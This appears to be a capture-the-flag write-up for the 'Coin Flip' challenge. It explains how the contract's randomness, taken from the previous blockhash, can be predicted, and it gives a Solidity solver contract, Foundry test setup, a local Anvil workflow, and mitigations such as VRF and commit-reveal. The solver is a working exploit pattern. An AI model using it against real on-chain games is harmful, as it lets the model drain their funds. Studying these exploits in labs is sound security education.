# 03. Coin Flip

[English](03_CoinFlip.md) | [한국어](../ko/03_CoinFlip.md)

## Objective

Correctly predict the coin flip ten times in a row.

## Key Concepts

- Predictable on-chain randomness
- Public block metadata
- `blockhash(block.number - 1)`
- Deterministic calculations
- One prediction transaction per block
- Foundry's `vm.roll()` and `vm.setBlockhash()` cheatcodes
- Local Anvil block progression

## Contract Analysis

### Deterministic Coin Flip

The target calculates each result from the previous block hash:

```solidity
uint256 blockValue = uint256(blockhash(block.number - 1));
uint256 coinFlip = blockValue / FACTOR;
bool side = coinFlip == 1 ? true : false;
```

`blockhash(block.number - 1)` looks up the hash of the immediately preceding block. It does not generate a new hash.

The `FACTOR` value is `2^255`. A block hash is a 256-bit value, so dividing it by `2^255` produces either `0` or `1`. The contract converts that result into `false` or `true`.

This calculation is deterministic: the same previous block hash always produces the same side.

### Why the Result Is Predictable

The previous block hash is public. A solver contract can read it and repeat the target's calculation before calling `flip()`.

Both calculations happen during the same transaction and therefore use the same current block number and the same previous block hash:

```text
Solver reads the previous block hash
        ↓
Solver calculates the expected side
        ↓
Solver calls CoinFlip.flip(predictedSide)
        ↓
CoinFlip reads the same previous block hash
        ↓
CoinFlip calculates the same side
        ↓
The prediction succeeds
```

### Why One Attempt Is Required per Block

The target stores the last block-hash value it used:

```solidity
if (lastHash == blockValue) {
    revert();
}

lastHash = blockValue;
```

Calling `flip()` twice in the same block reuses the same previous block hash and causes the second call to revert. The solution must therefore submit one prediction in each of ten different blocks.

This guard limits call frequency but does not make the outcome unpredictable.

## Solver Contract

```solidity
constructor(address targetAddress) {
    target = ICoinFlip(targetAddress);
}

function solve() external {
    uint256 previousBlockHashValue =
        uint256(blockhash(block.number - 1));

    uint256 predictedOutcome =
        previousBlockHashValue / FACTOR;

    bool predictedSide = predictedOutcome == 1;

    target.flip(predictedSide);
}
```

The target address is fixed when `CoinFlipSolver` is deployed. Each call to `solve()` reads the same public value that the target will use and submits the predicted side. The solver does not control the block hash.

## Foundry Test Environment

### `vm.roll()`

```solidity
vm.roll(block.number + 1);
```

This changes the current block number so that each prediction represents a new block. It does not mine the skipped block or automatically create its block hash.

### `vm.setBlockhash()`

```solidity
uint256 previousBlockNumber = block.number - 1;
bytes32 simulatedPreviousBlockHash =
    keccak256(abi.encodePacked(block.number, round));

vm.setBlockhash(
    previousBlockNumber,
    simulatedPreviousBlockHash
);
```

`vm.setBlockhash(blockNumber, hash)` tells Foundry which value `blockhash(blockNumber)` should return.

The `keccak256` expression is not Ethereum's real block-hash formula and is not part of the solver logic. It simply creates a distinct 32-byte value for each simulated previous block. Any distinct block hashes would work because the solver predicts both possible outcomes.

On an actual chain, the network produces block hashes automatically. A player would submit one solver transaction per new block instead of using these cheatcodes.

## Test Flow

```text
Move to the next simulated block
        ↓
Provide a simulated previous block hash
        ↓
Solver predicts the side from that hash
        ↓
Target calculates the side from the same hash
        ↓
Verify that consecutiveWins increased
        ↓
Repeat until ten wins
```

## Local Anvil Reproduction

The unit test isolates the calculation and uses cheatcodes to provide the missing block history. The optional Anvil workflow complements it by producing blocks and submitting each prediction as a real local transaction.

Start a fresh local node:

```bash
make anvil
```

In a second terminal, deploy `CoinFlip` and `CoinFlipSolver`:

```bash
make coinflip-deploy
```

Submit all ten predictions and verify the result:

```bash
make coinflip-solve
make coinflip-status
```

To observe one round at a time, use:

```bash
make coinflip-step
make coinflip-status
```

Before every prediction, the Makefile mines one empty local block. This gives the next script invocation a new previous block hash during both Forge's simulation and the broadcast transaction. The solver still reads the automatically produced block hash; it does not set one with a cheatcode.

The workflow is deliberately restricted to `127.0.0.1:8545`, chain ID `31337`, and Anvil's public first development account. The account key is a well-known test credential for local development only and must never be used with real funds or a public network. Local deployment addresses are saved to `.anvil/coinflip.env`, which is ignored by Git.

## Root Cause

The contract treats public and deterministic block metadata as secret randomness. The `lastHash` check prevents repeated use within one block but does not stop another contract from reproducing the calculation.

On-chain values such as block hashes, timestamps, block numbers, and `prevrandao` should not be assumed to be secret. Some block producers may also be able to influence certain block values.

## Recommended Mitigations

- Use a verifiable randomness service such as Chainlink VRF when appropriate.
- Consider a commit-reveal scheme when its timing and participation trade-offs are acceptable.
- Do not derive security-sensitive random outcomes solely from public block metadata.
- Account for block-producer influence and transaction-ordering risks.
- Test both predictability and manipulation resistance when reviewing randomness.

## Run the Test

```bash
forge test --match-path test/03_CoinFlip.t.sol -vvv
```

To inspect the complete call trace:

```bash
forge test --match-path test/03_CoinFlip.t.sol -vvvv
```

## Takeaway

Hashing or transforming public data does not make it unpredictable. If another contract can access the same inputs before submitting a guess, it can reproduce the calculation and predict the result.
